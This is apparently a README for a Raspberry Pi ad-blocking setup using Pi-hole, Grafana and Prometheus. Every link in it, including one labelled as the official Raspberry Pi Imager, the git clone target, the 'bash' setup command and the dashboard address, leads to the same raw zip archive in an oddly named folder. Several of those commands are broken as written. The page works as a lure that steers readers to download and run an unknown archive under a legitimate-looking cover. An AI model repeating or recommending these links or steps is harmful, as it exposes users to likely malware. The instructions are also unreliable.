# 🌟 deathstar-pi-hole-setup - Easy Setup for Ad Blocking

## 🚀 Getting Started

Welcome to the deathstar-pi-hole-setup! This application helps you set up an ad-blocking system using Raspberry Pi, Pi-hole, Grafana, and Prometheus. With this setup, you will enjoy a smoother internet experience by blocking unwanted ads and monitoring your network.

## 🛠️ System Requirements

Before you begin, ensure you have the following:

- A Raspberry Pi (any model, but Raspberry Pi 3 or later is recommended)
- A microSD card (minimum 16GB)
- A power supply for your Raspberry Pi
- An internet connection (wired recommended)
- A computer to access the Raspberry Pi

## 🔗 Download

[![Download the Latest Release](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip)

To download the application, visit the Releases page:

[Download from Github Releases](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip)

## 📥 Download & Install

1. Click the link above to open the Releases page.
2. Look for the latest version at the top of the list.
3. Download the `.zip` or `https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip` file that suits your Raspberry Pi model.
4. Once the download is complete, unzip or extract the file to a location on your computer.

## 📋 Setting Up Your Raspberry Pi

### Step 1: Prepare Your SD Card

1. Download and install [Raspberry Pi Imager](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip) on your computer.
2. Launch Raspberry Pi Imager.
3. Select the operating system. Choose Raspberry Pi OS Lite for a minimal setup.
4. Select your microSD card from the storage list.
5. Click "Write" to install the OS onto the microSD card.

### Step 2: Configure Your Raspberry Pi

1. Insert the microSD card into your Raspberry Pi.
2. Connect your Raspberry Pi to a monitor, keyboard, and power source.
3. Boot your Raspberry Pi and follow the on-screen instructions to complete the setup.
4. Once set up, connect your Raspberry Pi to your network.

### Step 3: Clone the Repository

1. Open a terminal on your Raspberry Pi.
2. Install Git if it is not already installed:

   ```bash
   sudo apt update
   sudo apt install git
   ```

3. Clone the repository by entering:

   ```bash
   git clone https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip
   ```

### Step 4: Run the Setup Script

1. Navigate to the cloned directory:

   ```bash
   cd deathstar-pi-hole-setup
   ```

2. Run the setup script:

   ```bash
   bash https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip
   ```

3. Follow the prompts to configure Pi-hole, Grafana, and Prometheus. 

## ⚙️ Configuration Options

During the setup, you will encounter various options for configuring your ad blocker and analytics tools. Here are some common choices:

- **Pi-hole Configuration**: Choose the type of ads you wish to block. You can select individual categories or groups.
  
- **Grafana Settings**: Decide on your preferred dashboard layout for monitoring network usage.

- **Prometheus Metrics**: Choose which metrics you want Prometheus to collect and visualize.

## 🔍 Monitoring Your Network

Once the setup is complete, you can check your network status through the Grafana dashboard:

1. Open a web browser on your computer.
2. Enter the Raspberry Pi's IP address followed by the Grafana port number (default is 3000). For example: `https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip`
3. Log in using the default credentials you set during installation.

From here, you can customize your dashboard and start monitoring your network activity.

## 🧑‍🤝‍🧑 Community Support

If you have questions or need assistance, consider joining our community:

- Check the [GitHub Issues Page](https://raw.githubusercontent.com/xolisbeamed/deathstar-pi-hole-setup/main/imbecility/deathstar-pi-hole-setup.zip) for common issues.
- Join the discussions and ask questions.

## 📝 Troubleshooting Tips

- **Can't Access the Dashboard**: Ensure your Raspberry Pi is powered on and connected to the network. Double-check the IP address.
  
- **Installation Fails**: Review the terminal output for errors. Ensure your network connection is stable.

- **Performance Issues**: Ensure you are not blocking essential domains required by your network devices.

## 🚧 Features

- **Network-wide Ad Blocking**: Eliminate ads across all devices on your network.
- **Internet Monitoring**: Gain insights into your network's traffic and usage patterns.
- **Smart Home Integration**: Easily integrate with smart home devices for better analytics.

For full details on each feature, refer to the documentation files in the repository.

By following these steps, you can easily set up your deathstar-pi-hole environment. Happy networking!